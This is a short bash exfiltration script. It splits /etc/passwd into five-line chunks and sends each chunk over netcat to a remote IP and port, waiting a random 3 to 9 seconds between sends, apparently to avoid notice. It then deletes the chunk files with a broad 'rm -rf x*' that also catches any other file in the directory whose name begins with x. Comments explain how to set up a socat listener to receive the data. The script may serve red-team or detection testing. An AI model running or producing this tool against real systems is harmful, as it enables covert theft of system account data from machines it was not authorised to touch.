#!/bin/bash
# exfiltrate.sh
#
# This script splits /etc/passwd into 5-line fragments and exfiltrates
# each fragment to a remote system using netcat with a random delay
# between 3 and 9 seconds.
#
# IMPORTANT: Before running this script, ensure netcat (nc) is running on the remote system.
# For example, on the remote system, you might run:
#   socat TCP-LISTEN:12345,reuseaddr,fork - > output.txt 2>&1
#
# Usage: ./exfiltrate.sh <target_ip> <port>
# Example: ./exfiltrate.sh 192.168.1.100 12345

# Function to display help/usage information
usage() {
  echo "Usage: $0 <target_ip> <port>"
  echo ""
  echo "Description:"
  echo "  This script splits the /etc/passwd file into smaller chunks and"
  echo "  exfiltrates each chunk via netcat with a random delay between"
  echo "  3 and 9 seconds to randomize the sent data."
  echo ""
  echo "  IMPORTANT: Ensure that netcat (nc) is running on the remote system."
  echo "  For example, on the remote system run:"
  echo "      socat TCP-LISTEN:12345,reuseaddr,fork -"
  echo ""
  echo "Example:"
  echo "  $0 192.168.1.100 12345"
  exit 1
}

# Check if the correct number of arguments is provided
if [ "$#" -ne 2 ]; then
  usage
fi

TARGET_IP="$1"
TARGET_PORT="$2"

# Inform the user to ensure netcat is running on the remote system
echo "Ensure that netcat is running on the remote system using:"
echo "  socat TCP-LISTEN:12345,reuseaddr,fork -"
echo ""

# Split /etc/passwd into 5-line fragments (files named like x00, x01, ...)
split /etc/passwd -l 5 -d --verbose

# Loop over each generated file and exfiltrate it with a randomized delay
for file in x*; do
  # Generate a random delay between 3 and 9 seconds
  delay=$(( (RANDOM % 7) + 3 ))
  echo "Waiting for ${delay} seconds before sending ${file}..."
  sleep ${delay}
  # Send the file fragment via netcat
  cat "${file}" | nc -q 0 ${TARGET_IP} ${TARGET_PORT}
done

rm -rf x*
